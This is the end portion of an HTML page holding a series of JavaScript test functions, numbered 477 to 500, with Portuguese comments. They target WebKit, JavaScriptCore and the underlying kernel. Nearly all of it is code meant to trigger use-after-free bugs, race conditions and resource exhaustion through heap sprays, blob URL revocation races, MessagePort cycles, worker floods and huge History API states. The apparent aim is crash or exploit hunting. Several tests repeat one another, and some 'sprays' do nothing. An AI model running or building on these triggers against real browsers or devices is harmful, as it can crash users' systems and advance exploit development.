            log("SUCCESS: Deep object sent to kernel.");
            setTimeout(()=>w.terminate(), 100);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 477. Kernel: Blob Slice Chain VFS Recursion Exhaustion
    // Mecânica: Criar uma cadeia de Slices de Blobs que referenciam uns aos outros, forçando recursão no VFS.
    function runTest477() {
        log("Init 477: Blob Slice Chain...");
        let blob = new Blob([new Uint8Array(1024).fill(0xAA)]);
        
        try {
            // Cria 2000 camadas de abstração VFS
            for(let i=0; i<2000; i++) {
                blob = blob.slice(0, blob.size);
            }
            
            // Força leitura para disparar a resolução da cadeia
            const fr = new FileReader();
            fr.readAsArrayBuffer(blob);
            fr.onloadend = () => log("SUCCESS: Slice chain resolved.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 478. Kernel: BroadcastChannel Navigation Destruction Race
    // Mecânica: Enviar mensagens broadcast enquanto navega/destroi iframes receptores.
    function runTest478() {
        log("Init 478: Broadcast Navigation...");
        const bc = new BroadcastChannel("nav_race");
        const frames = [];

        // Cria alvos
        for(let i=0; i<15; i++) {
            const f = document.createElement('iframe');
            document.body.appendChild(f);
            // Registra listener no processo filho
            f.contentWindow.eval(`const bc = new BroadcastChannel('nav_race'); bc.onmessage = () => {};`);
            frames.push(f);
        }

        let k = 0;
        const iv = setInterval(() => {
            bc.postMessage("storm"); // Envia para todos
            
            // Navega e destroi aleatoriamente
            if(frames.length > 0) {
                const idx = Math.floor(Math.random() * frames.length);
                const f = frames[idx];
                if(k % 2 === 0) f.src = "about:blank"; // Navegação (detach lógico)
                else {
                    frames.splice(idx, 1);
                    f.remove(); // Destruição (detach físico)
                }
            }
            
            if(k++ > 50) {
                clearInterval(iv);
                bc.close();
                log("SUCCESS: Navigation race finished.");
            }
        }, 10);
    }

    // 479. Kernel: History State Large Allocation Paging Stress
    // Mecânica: PushState de objetos gigantes para forçar paginação e memory mapping no kernel.
    function runTest479() {
        log("Init 479: History Paging...");
        const huge = new Uint8Array(1024 * 1024 * 5).fill(0xFF); // 5MB
        
        let k = 0;
        const iv = setInterval(() => {
            try {
                // Serialização de 5MB por tick
                history.pushState(huge, "s"+k, null);
                
                // Navegação rápida força swap in/out desses estados
                if(k % 5 === 0) history.back();
                
                // Limpa referências JS para forçar GC, mas o histórico mantém no Kernel/Processo
            } catch(e) {
                // Ignore QuotaExceeded
            }
            
            if(k++ > 50) {
                clearInterval(iv);
                log("SUCCESS: History paging stress.");
            }
        }, 20);
    }

    // 480. Kernel: XHR Blob URL Abort-Revoke Race
    // Mecânica: Inicia XHR em Blob URL, revoga a URL e aborta a requisição simultaneamente.
    function runTest480() {
        log("Init 480: XHR Blob Abort...");
        const b = new Blob([new Uint8Array(1024*1024).fill(0x00)]);
        const u = URL.createObjectURL(b);
        const reqs = [];

        for(let i=0; i<50; i++) {
            const xhr = new XMLHttpRequest();
            xhr.open("GET", u, true);
            reqs.push(xhr);
        }

        // Inicia todos
        reqs.forEach(x => x.send());

        // Race: Revoke global vs Abort individual
        setTimeout(() => {
            URL.revokeObjectURL(u); // Remove inode virtual
            
            // Aborta em loop apertado
            reqs.forEach(x => x.abort());
            
            log("SUCCESS: XHR/VFS cleanup race.");
        }, 10);
    }
// 481. WebKit: SVG Use Element Shadow Tree UAF
    // Alvo: SVG Rendering Engine
    // Mecânica: Modifica o elemento referenciado por um <use> enquanto a shadow tree está sendo clonada/renderizada.
    function runTest481() {
        log("Init 481: SVG Shadow UAF...");
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
        const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
        g.id = "target";
        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        g.appendChild(rect);
        defs.appendChild(g);
        svg.appendChild(defs);
        document.body.appendChild(svg);

        const use = document.createElementNS("http://www.w3.org/2000/svg", "use");
        use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
        
        // MutationObserver para interceptar a construção da shadow tree
        const mo = new MutationObserver(() => {
            g.remove(); // Remove a definição original
            const spray = new Array(1000).fill(1); // Heap spray
        });
        mo.observe(svg, {childList: true, subtree: true});
        
        try {
            svg.appendChild(use); // Trigger
            // Força layout
            const b = use.getBoundingClientRect(); 
            log("SUCCESS: SVG Layout logic survived.");
        } catch(e) { log("ERR: " + e.message); }
        if(document.body.contains(svg)) document.body.removeChild(svg);
    }

    // 482. WebKit: Document.open() Recursive Lifecycle Race
    // Alvo: DOM Loader / Document Lifecycle
    // Mecânica: Chama document.open() dentro de eventos de unload/pagehide causados pelo próprio open().
    function runTest482() {
        log("Init 482: Doc Lifecycle Race...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        let depth = 0;
        ifr.contentWindow.onunload = () => {
            if(depth++ < 50) {
                // Recursão perigosa dentro do teardown do documento
                try {
                    ifr.contentDocument.open();
                    ifr.contentDocument.write("A");
                    ifr.contentDocument.close();
                } catch(e) {}
            }
        };

        try {
            // Trigger inicial
            ifr.src = "about:blank";
            setTimeout(() => {
                ifr.contentDocument.open(); // Trigger manual
                ifr.contentDocument.close();
                log("SUCCESS: Document lifecycle recursion finished.");
                document.body.removeChild(ifr);
            }, 10);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 483. WebKit: TextTrackCueList Sort Order Corruption
    // Alvo: Media Element / TextTrack
    // Mecânica: Altera o tempo de início dos Cues para forçar reordenação da lista interna enquanto itera sobre ela.
    function runTest483() {
        log("Init 483: CueList Sort Corruption...");
        const v = document.createElement('video');
        const t = v.addTextTrack("subtitles");
        
        for(let i=0; i<500; i++) {
            t.addCue(new VTTCue(i, i+1, "Text"));
        }

        try {
            // Acessa a lista (gera cache)
            const cues = t.cues;
            // Modifica timestamps inversamente para forçar sort massivo
            for(let i=0; i<cues.length; i++) {
                cues[i].startTime = 500 - i;
                // No meio da reordenação, remove um cue
                if(i === 250) t.removeCue(cues[0]);
            }
            log("SUCCESS: Cue list sort handled.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 484. WebKit: Map Iterator Side-Effect Invalidator
    // Alvo: JavaScriptCore Map Implementation
    // Mecânica: Itera sobre um Map e usa um getter na chave para limpar o Map durante a iteração.
    function runTest484() {
        log("Init 484: Map Iterator Invalidator...");
        const m = new Map();
        const key = {
            toString: () => {
                m.clear(); // Efeito colateral destrutivo
                // Heap spray para preencher o backing store liberado
                const junk = new Float64Array(1024).fill(1.1); 
                return "key";
            }
        };
        
        for(let i=0; i<100; i++) m.set(i, i);
        m.set(key, "val"); // Adiciona a chave venenosa
        
        try {
            // Força a conversão da chave para string (algumas implementações fazem isso em logs ou lookups)
            // Ou itera e acessa propriedades
            for(const k of m.keys()) {
                if(typeof k === 'object') String(k); 
            }
            log("SUCCESS: Map iteration survived clear.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 485. WebKit: Huge String Rope Flattening OOM
    // Alvo: JSC String Allocator (Rope vs Flattened)
    // Mecânica: Cria uma string "Rope" (concatenada logicamente) gigante e força sua linearização.
    function runTest485() {
        log("Init 485: Rope Flattening...");
        let s = "A";
        // Cria estrutura de árvore profunda (Rope)
        for(let i=0; i<26; i++) s += s; // 2^26 = ~67MB
        
        try {
            // match() ou replace() muitas vezes forçam "flattening" (converter árvore em buffer contíguo)
            // Se a memória estiver fragmentada, falha na alocação ou corrompe heap
            s.match(/B/); 
            log("SUCCESS: Rope flattened or limit hit safely.");
        } catch(e) { log("ERR: " + e.message); }
        s = null;
    }

    // 486. Kernel: VM Map Entry Split/Merge Race (Transfer)
    // Alvo: Kernel Virtual Memory Manager (mmap/munmap)
    // Mecânica: Transfere ArrayBuffers grandes (que usam mmap) entre workers freneticamente.
    function runTest486() {
        log("Init 486: VM Map Transfer Race...");
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{postMessage(e.data,[e.data])}"],{type:'text/javascript'})));
        
        // 50MB buffer (garante mmap no backend)
        let ab = new ArrayBuffer(1024 * 1024 * 50); 
        let cycles = 0;
        
        w.onmessage = (e) => {
            ab = e.data;
            if(cycles++ < 100) {
                // Ping-pong rápido força unmapping e mapping no kernel
                w.postMessage(ab, [ab]);
            } else {
                w.terminate();
                log("SUCCESS: VM Map ping-pong complete.");
            }
        };
        
        w.postMessage(ab, [ab]);
    }

    // 487. Kernel: Socket Buffer Upload vs Blob Revocation
    // Alvo: Network Stack / VFS
    // Mecânica: Upload XHR de um Blob grande, revogando o Blob no meio do upload.
    function runTest487() {
        log("Init 487: Socket vs Blob Revoke...");
        const blob = new Blob([new Uint8Array(1024 * 1024 * 10).fill(0xAA)]); // 10MB
        const u = URL.createObjectURL(blob);
        const xhr = new XMLHttpRequest();
        
        xhr.open("POST", "/dummy_upload", true);
        
        // Tenta enviar o stream
        try {
            xhr.send(blob);
            
            // Race: Revoga o UUID do blob enquanto o kernel lê as páginas
            setTimeout(() => {
                URL.revokeObjectURL(u);
                // Aborta para causar cleanup concorrente
                xhr.abort();
                log("SUCCESS: Upload race dispatched.");
            }, 10);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 488. Kernel: Port Entanglement Cannibalism
    // Alvo: IPC Subsystem (Mach/BSD Ports)
    // Mecânica: Envia portas através de si mesmas e fecha os canais em ordem específica para causar referências órfãs.
    function runTest488() {
        log("Init 488: Port Cannibalism...");
        const ch1 = new MessageChannel();
        const ch2 = new MessageChannel();
        const ch3 = new MessageChannel();
        
        try {
            // Complex topology
            ch1.port1.postMessage("eat", [ch2.port1]);
            ch2.port2.postMessage("eat", [ch3.port1]);
            ch3.port2.postMessage("eat", [ch1.port2]); // Ciclo fechado
            
            // Fecha pontos de acesso externos
            setTimeout(() => {
                ch1.port1.close();
                ch2.port2.close();
                ch3.port2.close();
                log("SUCCESS: Cannibalism cycle closed.");
            }, 50);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 489. Kernel: Iframe Navigation Storm vs Vnode Lock
    // Alvo: VFS Locking
    // Mecânica: Múltiplos iframes navegando para o mesmo Blob URL que é revogado repetidamente.
    function runTest489() {
        log("Init 489: Nav Storm vs Vnode...");
        const blob = new Blob(["<html><body>Test</body></html>"], {type: 'text/html'});
        const u = URL.createObjectURL(blob);
        const iframes = [];
        
        for(let i=0; i<20; i++) {
            const f = document.createElement('iframe');
            document.body.appendChild(f);
            iframes.push(f);
        }
        
        let k = 0;
        const iv = setInterval(() => {
            iframes.forEach(f => f.src = u); // Força lookup VFS simultâneo
            
            if(k % 5 === 0) {
                URL.revokeObjectURL(u); // Remove inode
                // Recria para manter o loop
                const newU = URL.createObjectURL(blob); 
            }
            
            if(k++ > 20) {
                clearInterval(iv);
                iframes.forEach(f => f.remove());
                log("SUCCESS: Navigation storm finished.");
            }
        }, 20);
    }

    // 490. Kernel: Thread Signal Handling Stress (Worker Bomb)
    // Alvo: Kernel Process/Thread Manager
    // Mecânica: Criação/Destruição extremamente rápida de workers que registram timers (sinais).
    function runTest490() {
        log("Init 490: Thread Signal Stress...");
        const code = `setInterval(()=>{}, 1);`; // Força registro de timer no loop
        const u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
        
        let k = 0;
        const iv = setInterval(() => {
            for(let i=0; i<10; i++) {
                const w = new Worker(u);
                // Terminate imediato: Race entre inicialização da thread e sinal de kill
                w.terminate(); 
            }
            if(k++ > 50) { // 500 threads
                clearInterval(iv);
                log("SUCCESS: Thread bomb dispatched.");
            }
        }, 10);
    }
 // 491. WebKit: Map Iterator Invalidation UAF
    // Alvo: JSC Map Iterator
    // Mecânica: Limpa o Map durante a iteração através de um efeito colateral na conversão de chave.
    function runTest491() {
        log("Init 491: Map Iterator UAF...");
        const m = new Map();
        const killer = {
            toString: () => {
                m.clear(); 
                const spray = new Array(10000).fill(1.1); 
                return "killer";
            }
        };
        for(let i=0; i<100; i++) m.set(i, i);
        m.set(killer, "value"); 
        try {
            for(const k of m.keys()) {
                if(typeof k === 'object') String(k);
            }
            log("SUCCESS: Map iteration handled.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 492. WebKit: Range Boundary SplitText Mutation Race
    // Alvo: DOM Range
    // Mecânica: Modifica nós de texto referenciados por um Range ativo dentro de um MutationObserver.
    function runTest492() {
        log("Init 492: Range Mutation...");
        const p = document.createElement('p');
        const t = document.createTextNode("AAAAABBBBB");
        p.appendChild(t);
        document.body.appendChild(p);
        const r = document.createRange();
        r.setStart(t, 2);
        r.setEnd(t, 8);
        const mo = new MutationObserver(() => {
            t.splitText(5);
            p.normalize();
        });
        mo.observe(p, {childList: true, characterData: true, subtree: true});
        try {
            t.data = "CCCCCDDDDD"; 
            const ext = r.extractContents();
            log("SUCCESS: Range survived split.");
        } catch(e) { log("ERR: " + e.message); }
        if(p.parentNode) p.remove();
    }

    // 493. WebKit: MessagePort Transfer & Close Race
    // Alvo: MessagePort Logic
    // Mecânica: Transfere portas para worker e fecha imediatamente na thread principal.
    function runTest493() {
        log("Init 493: Port Transfer Race...");
        const code = `self.onmessage=e=>{try{e.data.postMessage("pong")}catch(x){}}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        try {
            for(let i=0; i<50; i++) {
                const w = new Worker(u);
                const ch = new MessageChannel();
                w.postMessage(ch.port2, [ch.port2]);
                ch.port1.close(); // Race condition
                w.terminate();
            }
            log("SUCCESS: Port race executed.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 494. WebKit: HTMLMediaElement TextTrack List Poisoning
    // Alvo: Media Track List
    // Mecânica: Manipula a lista de Cues durante o evento de mudança de Cue.
    function runTest494() {
        log("Init 494: Track List Poison...");
        const v = document.createElement('video');
        const t = v.addTextTrack("subtitles");
        t.mode = "hidden";
        for(let i=0; i<1000; i++) t.addCue(new VTTCue(i/10, (i/10)+0.1, "T"+i));
        t.oncuechange = () => {
            if(t.cues.length > 0) t.removeCue(t.cues[0]);
        };
        try {
            // Fake time update
            const ev = new Event('timeupdate');
            v.dispatchEvent(ev);
            log("SUCCESS: Track list mutation handled.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 495. WebKit: DocumentFragment Insertion Mutation UAF
    // Alvo: DOM Insertion
    // Mecânica: Remove o alvo de inserção durante o processamento do fragmento.
    function runTest495() {
        log("Init 495: Fragment Insertion...");
        const div = document.createElement('div');
        document.body.appendChild(div);
        const frag = document.createDocumentFragment();
        for(let i=0; i<500; i++) frag.appendChild(document.createElement('span'));
        
        const mo = new MutationObserver(() => {
            if(document.body.contains(div)) document.body.removeChild(div);
        });
        mo.observe(document.body, {childList: true});
        
        try {
            div.appendChild(frag);
            log("SUCCESS: Insertion logic safe.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 496. Kernel: Blob VFS Lookup vs Revoke vs Thread Kill
    // Alvo: VFS Lookup Lock
    // Mecânica: Fetch concorrente em Blob URL sendo revogada.
    function runTest496() {
        log("Init 496: VFS Lookup Race...");
        const b = new Blob([new Uint8Array(1024*1024*2).fill(0xAA)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{const u=e.data;const t=Date.now();while(Date.now()-t<200)fetch(u).catch(()=>{})}`;
        const uW = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<10; i++) {
                const w = new Worker(uW);
                w.postMessage(u);
                workers.push(w);
            }
            setTimeout(() => {
                URL.revokeObjectURL(u);
                workers.forEach(w => w.terminate());
                log("SUCCESS: VFS race triggered.");
            }, 50);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 497. Kernel: IPC Port Ring Refcount Underflow
    // Alvo: IPC Refcounting
    // Mecânica: Cria anel de portas e fecha aleatoriamente para isolar referências.
    function runTest497() {
        log("Init 497: Port Ring Panic...");
        const size = 150;
        const ring = [];
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const n = (i+1)%size;
                ring[i].port1.postMessage("L", [ring[n].port1]);
            }
            let k = 0;
            const iv = setInterval(() => {
                const idx = Math.floor(Math.random()*size);
                try { ring[idx].port2.close(); } catch(x){}
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCCESS: Ring broken.");
                }
            }, 2);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 498. Kernel: BroadcastChannel Navigation Storm
    // Alvo: IPC Broadcast
    // Mecânica: Broadcast massivo enquanto iframes receptores navegam/destroem.
    function runTest498() {
        log("Init 498: Broadcast Storm...");
        const bc = new BroadcastChannel("storm");
        const frames = [];
        for(let i=0; i<20; i++) {
            const f = document.createElement('iframe');
            document.body.appendChild(f);
            f.contentWindow.onstorage = () => {};
            frames.push(f);
        }
        let k = 0;
        const iv = setInterval(() => {
            bc.postMessage("data");
            if(frames.length > 0 && k % 2 === 0) {
                const f = frames.pop();
                f.src = "about:blank";
                setTimeout(() => f.remove(), 10);
            }
            if(k++ > 60) {
                clearInterval(iv);
                bc.close();
                log("SUCCESS: Storm finished.");
            }
        }, 10);
    }

    // 499. Kernel: History State Paging Exhaustion
    // Alvo: Kernel VM Paging
    // Mecânica: Serialização massiva de objetos grandes via History API.
    function runTest499() {
        log("Init 499: History Paging...");
        const huge = new Uint8Array(1024*1024*4).fill(0xCC);
        let k = 0;
        const iv = setInterval(() => {
            try {
                history.pushState(huge, "s"+k, null);
                if(k % 5 === 0) history.back();
            } catch(e) {}
            if(k++ > 40) {
                clearInterval(iv);
                log("SUCCESS: Paging stress applied.");
            }
        }, 20);
    }

    // 500. Kernel: XHR Blob URL Abort-Revoke Race
    // Alvo: VFS/Socket Race
    // Mecânica: XHR em Blob URL, abortar e revogar simultaneamente.
    function runTest500() {
        log("Init 500: XHR Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024).fill(0x00)]);
        const u = URL.createObjectURL(b);
        const reqs = [];
        for(let i=0; i<40; i++) {
            const xhr = new XMLHttpRequest();
            xhr.open("GET", u, true);
            reqs.push(xhr);
        }
        reqs.forEach(r => r.send());
        setTimeout(() => {
            URL.revokeObjectURL(u);
            reqs.forEach(r => r.abort());
            log("SUCCESS: XHR race dispatched.");
        }, 10);
    }
</script>

</body>
</html>
